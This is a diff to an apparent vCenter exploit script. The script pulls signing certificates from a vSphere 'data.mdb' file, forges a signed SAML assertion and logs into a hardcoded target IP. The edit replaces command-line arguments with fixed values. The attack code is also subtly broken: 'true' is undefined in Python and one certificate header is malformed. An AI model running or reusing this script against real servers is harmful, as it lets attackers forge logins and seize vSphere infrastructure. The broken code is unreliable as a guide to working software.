@@ -336,16 +336,15 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
     parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates')
     #args = parser.parse_args()
-    def __init__(args, path, target, verbose):
-        args.path = "./../data.mdb"
-        args.target = "10.70.20.10"
-        args.verbose = true
+    argspath = "./../data.mdb"
+    argstarget = "10.70.20.10"
+    argsverbose = true
 
     # Extract certificates
-    in_stream = open(args.path, 'rb')
+    in_stream = open(argspath, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
-    idp_cert = get_idp_cert(bin_stream, args.verbose)
-    trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
+    idp_cert = get_idp_cert(bin_stream, argsverbose)
+    trusted_cert_1, domain = get_trusted_cert1(bin_stream, argsverbose)
     domain = 'vsphere.local'
     trusted_cert_1 = \
 """--BEGIN CERTIFICATE-----
@@ -370,16 +369,16 @@ cKJrz35mUAe+W+xhphtUUwggfDk4F4oEikom58FbaeYJleDaRVI2ZuWKc0iIcYrV
 2Y9cdeexoxPeJuuh51Ck2n56xIY4cECAHxtvz4k2HBAm/qJc95e56cTdTQ9H6rmL
 Ye04JpHfpJ4qDDO8J7/dBjuM37pOXg==
 -----END CERTIFICATE-----"""
-    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
+    trusted_cert_2 = get_trusted_cert2(bin_stream, argsverbose)
     
 
 
     # Generate SAML request
-    hostname = get_hostname(args.target)
-    req = saml_request(args.target)
-    t = fill_template(hostname, args.target, domain,req)
+    hostname = get_hostname(argstarget)
+    req = saml_request(argstarget)
+    t = fill_template(hostname, argstarget, domain,req)
     print (trusted_cert_2)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-    c = login(args.target, s)
+    c = login(argstarget, s)
 
 
